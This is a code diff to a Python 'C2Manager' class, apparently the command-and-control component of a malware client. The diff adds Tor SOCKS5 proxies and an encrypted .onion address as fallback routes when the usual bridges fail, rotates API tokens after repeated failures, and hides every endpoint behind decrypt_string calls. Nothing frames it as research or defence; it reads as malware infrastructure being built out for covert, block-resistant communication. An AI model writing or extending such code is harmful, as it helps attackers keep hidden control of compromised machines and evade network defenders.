@@ -20,8 +20,18 @@ class C2Manager:
 
         self.bridges = []
 
+        self.onion_urls = [
+            decrypt_string("BkYMGz1rdk0hBA9KB09dBwdfHU8/Kjw7FzsYCFxdSxMU"), # Example .onion
+        ]
+
+        self.proxies = [
+            "socks5h://127.0.0.1:9050", # Standard TOR
+            "socks5h://127.0.0.1:9150", # TOR Browser
+        ]
+
         self.current_token_index = 0
         self.current_bridge_index = 0
+        self.current_proxy_index = -1 # -1 means no proxy
         self.failed_attempts = 0
         self.max_failures = 3
         self.lock = threading.Lock()
@@ -32,39 +42,46 @@ class C2Manager:
             tok = self.tokens[self.current_token_index]
             return tok.strip() if isinstance(tok, str) else ""
 
-    def get_current_bridge(self):
-        """Get current active bridge"""
+    def get_proxy(self):
+        """Get current proxy if failover is active"""
         with self.lock:
-            if not self.bridges: return ""
-            brd = self.bridges[self.current_bridge_index]
-            return brd.strip() if isinstance(brd, str) else ""
+            if self.current_proxy_index == -1: return None
+            return self.proxies[self.current_proxy_index % len(self.proxies)]
 
     def report_failure(self):
-        """Report a failure and potentially switch tokens"""
+        """Report a failure and potentially switch tokens/proxies"""
         with self.lock:
             self.failed_attempts += 1
             if self.failed_attempts >= self.max_failures:
-                self._switch_to_next()
+                # If we've failed enough, try enabling proxy
+                if self.current_proxy_index == -1:
+                    self.current_proxy_index = 0
+                    log_info("Enabling SOCKS5 proxy failover", "C2")
+                else:
+                    self.current_proxy_index += 1
+                    self._switch_to_next()
                 return True
         return False
 
     def report_success(self):
-        """Reset failure counter on success"""
+        """Reset failure counter and potentially disable proxy"""
         with self.lock:
             self.failed_attempts = 0
+            # If we succeed with proxy, we keep it for now. 
+            # If we succeed without it, definitely keep it off.
 
     def _switch_to_next(self):
         """Switch to next available token"""
-        old_token = self.current_token_index
-
         self.current_token_index = (self.current_token_index + 1) % len(self.tokens)
-
-        new_tk = self.tokens[self.current_token_index]
-        print(decrypt_string("NXFKNm4CLgsuFAJRHF5GHBxdFUs6PjIHNFcRVx5dOQ4BWR0FM3EtDXoMGV0eX0gZG0AKDiAlBhY1HA9WLVAIHgtKBUsycQ0pFE1KQxxcESUaWSNRf2QEH3RZRA=="))
+        log_info(f"Switched to token index {self.current_token_index}", "C2")
         self.failed_attempts = 0
 
     def get_api_url(self):
-        """Get full API URL with current bridge"""
+        """Get full API URL with current bridge or onion fallback"""
+        with self.lock:
+            if self.current_proxy_index != -1 and self.onion_urls:
+                return self.onion_urls[0] + decrypt_string("QVAXHzVhJE0hRhc=")
+
         try:
             from core.bridge_manager import bridge_manager
             route = bridge_manager.get_best_route()
@@ -79,7 +96,11 @@ class C2Manager:
         return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdRUFTAkJG1UVAwU=")
 
     def get_file_url(self):
-        """Get file URL with current bridge"""
+        """Get file URL with current bridge or onion fallback"""
+        with self.lock:
+            if self.current_proxy_index != -1 and self.onion_urls:
+                return self.onion_urls[0] + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
+
         try:
             from core.bridge_manager import bridge_manager
             route = bridge_manager.get_best_route()
@@ -93,4 +114,5 @@ class C2Manager:
             return bridge + decrypt_string("QVQRByt+Ow0uDFpFXUJXBw==")
         return decrypt_string("BkYMGz1rdk07BwMWBlwKHwlAGQZgPisFdREDVBcWBBUaSUgWYSpoHw==")
 
+from core.error_logger import log_info, log_error
 c2_manager = C2Manager()
